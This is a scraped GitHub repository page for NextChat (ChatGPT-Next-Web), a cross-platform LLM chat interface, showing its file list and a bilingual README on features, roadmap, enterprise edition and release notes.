This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_1d855a7d_20250110_115322.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=ChatGPTNextWeb%2FChatGPT-Next-Web)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ChatGPTNextWeb](/ChatGPTNextWeb)
/
**[ChatGPT-Next-Web](/ChatGPTNextWeb/ChatGPT-Next-Web)**
Public

* [Notifications](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web) You must be signed in to change notification settings
* [Fork
  60k](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web)
* [Star
   78.5k](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web)

A cross-platform ChatGPT/Gemini UI (Web / PWA / Linux / Win / MacOS). 一键拥有你自己的跨平台 ChatGPT/Gemini/Claude LLM 应用。

[nextchat.dev/chat](https://nextchat.dev/chat "https://nextchat.dev/chat")

### License

[MIT license](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/LICENSE)

[78.5k
stars](/ChatGPTNextWeb/ChatGPT-Next-Web/stargazers) [60k
forks](/ChatGPTNextWeb/ChatGPT-Next-Web/forks) [Branches](/ChatGPTNextWeb/ChatGPT-Next-Web/branches) [Tags](/ChatGPTNextWeb/ChatGPT-Next-Web/tags) [Activity](/ChatGPTNextWeb/ChatGPT-Next-Web/activity)
 [Star](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web)

 [Notifications](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web) You must be signed in to change notification settings

* [Code](/ChatGPTNextWeb/ChatGPT-Next-Web)
* [Issues
  484](/ChatGPTNextWeb/ChatGPT-Next-Web/issues)
* [Pull requests
  75](/ChatGPTNextWeb/ChatGPT-Next-Web/pulls)
* [Discussions](/ChatGPTNextWeb/ChatGPT-Next-Web/discussions)
* [Actions](/ChatGPTNextWeb/ChatGPT-Next-Web/actions)
* [Projects
  1](/ChatGPTNextWeb/ChatGPT-Next-Web/projects)
* [Security](/ChatGPTNextWeb/ChatGPT-Next-Web/security)
* [Insights](/ChatGPTNextWeb/ChatGPT-Next-Web/pulse)

Additional navigation options

* [Code](/ChatGPTNextWeb/ChatGPT-Next-Web)
* [Issues](/ChatGPTNextWeb/ChatGPT-Next-Web/issues)
* [Pull requests](/ChatGPTNextWeb/ChatGPT-Next-Web/pulls)
* [Discussions](/ChatGPTNextWeb/ChatGPT-Next-Web/discussions)
* [Actions](/ChatGPTNextWeb/ChatGPT-Next-Web/actions)
* [Projects](/ChatGPTNextWeb/ChatGPT-Next-Web/projects)
* [Security](/ChatGPTNextWeb/ChatGPT-Next-Web/security)
* [Insights](/ChatGPTNextWeb/ChatGPT-Next-Web/pulse)

# ChatGPTNextWeb/ChatGPT-Next-Web

    main[Branches](/ChatGPTNextWeb/ChatGPT-Next-Web/branches)[Tags](/ChatGPTNextWeb/ChatGPT-Next-Web/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2,890 Commits](/ChatGPTNextWeb/ChatGPT-Next-Web/commits/main/) | | |
| [.github](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/.github ".github") | | [.github](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/.github ".github") |  |  |
| [.husky](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/.husky ".husky") | | [.husky](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/.husky ".husky") |  |  |
| [app](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/app "app") | | [app](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/app "app") |  |  |
| [docs](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/docs "docs") | | [docs](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/docs "docs") |  |  |
| [public](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/public "public") | | [public](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/public "public") |  |  |
| [scripts](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/scripts "scripts") | | [scripts](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/scripts "scripts") |  |  |
| [src-tauri](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/src-tauri "src-tauri") | | [src-tauri](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/src-tauri "src-tauri") |  |  |
| [test](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/test "test") | | [test](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main/test "test") |  |  |
| [.babelrc](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.babelrc ".babelrc") | | [.babelrc](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.babelrc ".babelrc") |  |  |
| [.dockerignore](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.dockerignore ".dockerignore") | | [.dockerignore](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.dockerignore ".dockerignore") |  |  |
| [.env.template](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.env.template ".env.template") | | [.env.template](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.env.template ".env.template") |  |  |
| [.eslintignore](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.eslintignore ".eslintignore") | | [.eslintignore](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.eslintignore ".eslintignore") |  |  |
| [.eslintrc.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.eslintrc.json ".eslintrc.json") | | [.eslintrc.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.eslintrc.json ".eslintrc.json") |  |  |
| [.gitignore](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.gitignore ".gitignore") | | [.gitignore](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.gitignore ".gitignore") |  |  |
| [.gitpod.yml](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.gitpod.yml ".gitpod.yml") | | [.gitpod.yml](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.gitpod.yml ".gitpod.yml") |  |  |
| [.lintstagedrc.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.lintstagedrc.json ".lintstagedrc.json") | | [.lintstagedrc.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.lintstagedrc.json ".lintstagedrc.json") |  |  |
| [.prettierrc.js](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.prettierrc.js ".prettierrc.js") | | [.prettierrc.js](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/.prettierrc.js ".prettierrc.js") |  |  |
| [CODE\_OF\_CONDUCT.md](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") | | [CODE\_OF\_CONDUCT.md](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") |  |  |
| [Dockerfile](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/Dockerfile "Dockerfile") | | [Dockerfile](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/Dockerfile "Dockerfile") |  |  |
| [LICENSE](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/LICENSE "LICENSE") | | [LICENSE](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/LICENSE "LICENSE") |  |  |
| [README.md](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README.md "README.md") | | [README.md](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README.md "README.md") |  |  |
| [README\_CN.md](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md "README_CN.md") | | [README\_CN.md](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md "README_CN.md") |  |  |
| [README\_JA.md](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_JA.md "README_JA.md") | | [README\_JA.md](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_JA.md "README_JA.md") |  |  |
| [docker-compose.yml](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docker-compose.yml "docker-compose.yml") | | [docker-compose.yml](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docker-compose.yml "docker-compose.yml") |  |  |
| [jest.config.ts](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/jest.config.ts "jest.config.ts") | | [jest.config.ts](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/jest.config.ts "jest.config.ts") |  |  |
| [jest.setup.ts](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/jest.setup.ts "jest.setup.ts") | | [jest.setup.ts](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/jest.setup.ts "jest.setup.ts") |  |  |
| [next.config.mjs](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/next.config.mjs "next.config.mjs") | | [next.config.mjs](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/next.config.mjs "next.config.mjs") |  |  |
| [package.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/package.json "package.json") | | [package.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/package.json "package.json") |  |  |
| [tsconfig.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/tsconfig.json "tsconfig.json") | | [tsconfig.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/tsconfig.json "tsconfig.json") |  |  |
| [vercel.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/vercel.json "vercel.json") | | [vercel.json](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/vercel.json "vercel.json") |  |  |
| [yarn.lock](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/yarn.lock "yarn.lock") | | [yarn.lock](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/yarn.lock "yarn.lock") |  |  |
| View all files | | |

## Repository files navigation

* README
* Code of conduct
* MIT license
[![icon](https://private-user-images.githubusercontent.com/50035229/398187667-287c510f-f508-478e-ade3-54d30453dc18.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAzMDEsIm5iZiI6MTczNjUxMDAwMSwicGF0aCI6Ii81MDAzNTIyOS8zOTgxODc2NjctMjg3YzUxMGYtZjUwOC00NzhlLWFkZTMtNTRkMzA0NTNkYzE4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDExNTMyMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWI3ODNiNmQ3NDFiY2I5NzFjNGQyYWViYjk1Njk2MWQxM2UzYjNhZTVmMzkyZWE2YTE5ZGQyZDRhODE4MTViYzImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.UCKgkGwZ5hfFLADAIsG14qCy0oke6eYzMHfzdl3aSKk)](https://nextchat.dev/chat)
# NextChat (ChatGPT Next Web)

English / [简体中文](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md)

One-Click to get a well-designed cross-platform ChatGPT web UI, with Claude, GPT4 & Gemini Pro support.

一键免费部署你的跨平台私人 ChatGPT 应用, 支持 Claude, GPT4 & Gemini Pro 模型。

[![Saas](https://camo.githubusercontent.com/bbefafe37db726c0dafcf9dc561d5f32023f108a2a10c8fba731d7b1b0a37444/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4e657874436861742d536161732d677265656e3f6c6f676f3d6d6963726f736f667465646765)](https://nextchat.dev/chat?utm_source=readme)
[![Web](https://camo.githubusercontent.com/0fa1e9e043c1ae8e21ecde10b9b8d706e1e7d4f3bd6853b13082df28740beb90/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f5765622d5057412d6f72616e67653f6c6f676f3d6d6963726f736f667465646765)](https://app.nextchat.dev/)
[![Windows](https://camo.githubusercontent.com/78666480b2e28531b4efc12a6b12e788b85c35355fb82702a9121da2241390c5/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d57696e646f77732d626c75653f6c6f676f3d77696e646f7773)](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
[![MacOS](https://camo.githubusercontent.com/e753de82f223b9e3975ecae24a8d40813828f37da5a8d887e29dea973948f843/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d4d61634f532d626c61636b3f6c6f676f3d6170706c65)](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
[![Linux](https://camo.githubusercontent.com/aefb1e97078d07de14901974d23b7158881113f4a8dcfcea025333166ae500e2/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d4c696e75782d3333333f6c6f676f3d7562756e7475)](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)

[NextChatAI](https://nextchat.dev/chat?utm_source=readme) / [Web App Demo](https://app.nextchat.dev) / [Desktop App](https://github.com/Yidadaa/ChatGPT-Next-Web/releases) / [Discord](https://discord.gg/YCkeafCafC) / [Enterprise Edition](#enterprise-edition) / [Twitter](https://twitter.com/NextChatDev)

[NextChatAI](https://nextchat.dev/chat) / [自部署网页版](https://app.nextchat.dev) / [客户端](https://github.com/Yidadaa/ChatGPT-Next-Web/releases) / [企业版](#%E4%BC%81%E4%B8%9A%E7%89%88) / [反馈](https://github.com/Yidadaa/ChatGPT-Next-Web/issues)

[![Deploy on Vercel](https://camo.githubusercontent.com/20bea215d35a4e28f2c92ea5b657d006b087687486858a40de2922a4636301ab/68747470733a2f2f76657263656c2e636f6d2f627574746f6e)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=nextchat&repository-name=NextChat) [![Deploy on Zeabur](https://camo.githubusercontent.com/34df6b95f619465d16570ca8dd4d5a2aae99f4211d5de6d77bda8cfe5eba10f5/68747470733a2f2f7a65616275722e636f6d2f627574746f6e2e737667)](https://zeabur.com/templates/ZBUEFA) [![Open in Gitpod](https://camo.githubusercontent.com/b04f5659467d23b5109ba935a40c00decd264eea25c22d50a118021349eea94f/68747470733a2f2f676974706f642e696f2f627574746f6e2f6f70656e2d696e2d676974706f642e737667)](https://gitpod.io/#https://github.com/Yidadaa/ChatGPT-Next-Web) [![BT Deply Install](https://camo.githubusercontent.com/f2f5953a0229a22a0b94275cebfe2567fc767478b49edcd52428644e2fc5f5d8/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f42545f4465706c6f792d496e7374616c6c2d323061353361)](https://www.bt.cn/new/download.html)

[![](https://private-user-images.githubusercontent.com/20209191/360871243-903482d4-3e87-4134-9af1-f2588fa90659.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAzMDEsIm5iZiI6MTczNjUxMDAwMSwicGF0aCI6Ii8yMDIwOTE5MS8zNjA4NzEyNDMtOTAzNDgyZDQtM2U4Ny00MTM0LTlhZjEtZjI1ODhmYTkwNjU5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDExNTMyMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWNkM2Y0OWYyYzA2NzBkMDA5MWExZGYxMGFmZGNmMmU4YTUwOTVhMzY4NGQyZTYzMjc0YTQxZWU0NDZhM2YwNzQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.3roB7UFR8uuQOYFiy-8YM_8D5QMhuFL54VU4O3ZXo9w)](https://monica.im/?utm=nxcrp)

## Enterprise Edition

Meeting Your Company's Privatization and Customization Deployment Requirements:

* **Brand Customization**: Tailored VI/UI to seamlessly align with your corporate brand image.
* **Resource Integration**: Unified configuration and management of dozens of AI resources by company administrators, ready for use by team members.
* **Permission Control**: Clearly defined member permissions, resource permissions, and knowledge base permissions, all controlled via a corporate-grade Admin Panel.
* **Knowledge Integration**: Combining your internal knowledge base with AI capabilities, making it more relevant to your company's specific business needs compared to general AI.
* **Security Auditing**: Automatically intercept sensitive inquiries and trace all historical conversation records, ensuring AI adherence to corporate information security standards.
* **Private Deployment**: Enterprise-level private deployment supporting various mainstream private cloud solutions, ensuring data security and privacy protection.
* **Continuous Updates**: Ongoing updates and upgrades in cutting-edge capabilities like multimodal AI, ensuring consistent innovation and advancement.

For enterprise inquiries, please contact: **business@nextchat.dev**

## 企业版

满足企业用户私有化部署和个性化定制需求：

* **品牌定制**：企业量身定制 VI/UI，与企业品牌形象无缝契合
* **资源集成**：由企业管理人员统一配置和管理数十种 AI 资源，团队成员开箱即用
* **权限管理**：成员权限、资源权限、知识库权限层级分明，企业级 Admin Panel 统一控制
* **知识接入**：企业内部知识库与 AI 能力相结合，比通用 AI 更贴近企业自身业务需求
* **安全审计**：自动拦截敏感提问，支持追溯全部历史对话记录，让 AI 也能遵循企业信息安全规范
* **私有部署**：企业级私有部署，支持各类主流私有云部署，确保数据安全和隐私保护
* **持续更新**：提供多模态、智能体等前沿能力持续更新升级服务，常用常新、持续先进

企业版咨询: **business@nextchat.dev**

[![](https://private-user-images.githubusercontent.com/20209191/374835806-3d4305ac-6e95-489e-884b-51d51db5f692.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAzMDEsIm5iZiI6MTczNjUxMDAwMSwicGF0aCI6Ii8yMDIwOTE5MS8zNzQ4MzU4MDYtM2Q0MzA1YWMtNmU5NS00ODllLTg4NGItNTFkNTFkYjVmNjkyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDExNTMyMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUyN2M1MjI2MmU5ZWI2OTg2OGUyYWY5MTQzMzRhMGE5MGJhMGIwZTVmNzVhMjhjMjVkYzU1OTE2M2JjNjVmYmQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.kI-13JtrbocBuonKQAKc8i6yrjxh_DfkbA_WXbtX8Tw)](https://private-user-images.githubusercontent.com/20209191/374835806-3d4305ac-6e95-489e-884b-51d51db5f692.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAzMDEsIm5iZiI6MTczNjUxMDAwMSwicGF0aCI6Ii8yMDIwOTE5MS8zNzQ4MzU4MDYtM2Q0MzA1YWMtNmU5NS00ODllLTg4NGItNTFkNTFkYjVmNjkyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDExNTMyMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUyN2M1MjI2MmU5ZWI2OTg2OGUyYWY5MTQzMzRhMGE5MGJhMGIwZTVmNzVhMjhjMjVkYzU1OTE2M2JjNjVmYmQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.kI-13JtrbocBuonKQAKc8i6yrjxh_DfkbA_WXbtX8Tw)
## Features

* **Deploy for free with one-click** on Vercel in under 1 minute
* Compact client (~5MB) on Linux/Windows/MacOS, [download it now](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
* Fully compatible with self-deployed LLMs, recommended for use with [RWKV-Runner](https://github.com/josStorer/RWKV-Runner) or [LocalAI](https://github.com/go-skynet/LocalAI)
* Privacy first, all data is stored locally in the browser
* Markdown support: LaTex, mermaid, code highlight, etc.
* Responsive design, dark mode and PWA
* Fast first screen loading speed (~100kb), support streaming response
* New in v2: create, share and debug your chat tools with prompt templates (mask)
* Awesome prompts powered by [awesome-chatgpt-prompts-zh](https://github.com/PlexPt/awesome-chatgpt-prompts-zh) and [awesome-chatgpt-prompts](https://github.com/f/awesome-chatgpt-prompts)
* Automatically compresses chat history to support long conversations while also saving your tokens
* I18n: English, 简体中文, 繁体中文, 日本語, Français, Español, Italiano, Türkçe, Deutsch, Tiếng Việt, Русский, Čeština, 한국어, Indonesia

[![主界面](/ChatGPTNextWeb/ChatGPT-Next-Web/raw/main/docs/images/cover.png)](/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/docs/images/cover.png)

## Roadmap

* System Prompt: pin a user defined prompt as system prompt [#138](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)
* User Prompt: user can edit and save custom prompts to prompt list
* Prompt Template: create a new chat with pre-defined in-context prompts [#993](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/993)
* Share as image, share to ShareGPT [#1741](https://github.com/Yidadaa/ChatGPT-Next-Web/pull/1741)
* Desktop App with tauri
* Self-host Model: Fully compatible with [RWKV-Runner](https://github.com/josStorer/RWKV-Runner), as well as server deployment of [LocalAI](https://github.com/go-skynet/LocalAI): llama/gpt4all/rwkv/vicuna/koala/gpt4all-j/cerebras/falcon/dolly etc.
* Artifacts: Easily preview, copy and share generated content/webpages through a separate window [#5092](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/pull/5092)
* Plugins: support network search, calculator, any other apis etc. [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165) [#5353](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5353)
  + network search, calculator, any other apis etc. [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165) [#5353](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5353)
* Supports Realtime Chat [#5672](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5672)
* local knowledge base

## What's New

* 🚀 v2.15.8 Now supports Realtime Chat [#5672](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5672)
* 🚀 v2.15.4 The Application supports using Tauri fetch LLM API, MORE SECURITY! [#5379](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5379)
* 🚀 v2.15.0 Now supports Plugins! Read this: [NextChat-Awesome-Plugins](https://github.com/ChatGPTNextWeb/NextChat-Awesome-Plugins)
* 🚀 v2.14.0 Now supports Artifacts & SD
* 🚀 v2.10.1 support Google Gemini Pro model.
* 🚀 v2.9.11 you can use azure endpoint now.
* 🚀 v2.8 now we have a client that runs across all platforms!
* 🚀 v2.7 let's share conversations as image, or share to ShareGPT!
* 🚀 v2.0 is released, now you can create prompt templates, turn your ideas into reality! Read this: [ChatGPT Prompt Engineering Tips: Zero, One and Few Shot Prompting](https://www.allabtai.com/prompt-engineering-tips-zero-one-and-few-shot-prompting/).

## 主要功能

* 在 1 分钟内使用 Vercel **免费一键部署**
* 提供体积极小（~5MB）的跨平台客户端（Linux/Windows/MacOS）, [下载地址](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
* 完整的 Markdown 支持：LaTex 公式、Mermaid 流程图、代码高亮等等
* 精心设计的 UI，响应式设计，支持深色模式，支持 PWA
* 极快的首屏加载速度（~100kb），支持流式响应
* 隐私安全，所有数据保存在用户浏览器本地
* 预制角色功能（面具），方便地创建、分享和调试你的个性化对话
* 海量的内置 prompt 列表，来自[中文](https://github.com/PlexPt/awesome-chatgpt-prompts-zh)和[英文](https://github.com/f/awesome-chatgpt-prompts)
* 自动压缩上下文聊天记录，在节省 Token 的同时支持超长对话
* 多国语言支持：English, 简体中文, 繁体中文, 日本語, Español, Italiano, Türkçe, Deutsch, Tiếng Việt, Русский, Čeština, 한국어, Indonesia
* 拥有自己的域名？好上加好，绑定后即可在任何地方**无障碍**快速访问

## 开发计划

* 为每个对话设置系统 Prompt [#138](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)
* 允许用户自行编辑内置 Prompt 列表
* 预制角色：使用预制角色快速定制新对话 [#993](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/993)
* 分享为图片，分享到 ShareGPT 链接 [#1741](https://github.com/Yidadaa/ChatGPT-Next-Web/pull/1741)
* 使用 tauri 打包桌面应用
* 支持自部署的大语言模型：开箱即用 [RWKV-Runner](https://github.com/josStorer/RWKV-Runner) ，服务端部署 [LocalAI 项目](https://github.com/go-skynet/LocalAI) llama / gpt4all / rwkv / vicuna / koala / gpt4all-j / cerebras / falcon / dolly 等等，或者使用 [api-for-open-llm](https://github.com/xusenlinzy/api-for-open-llm)
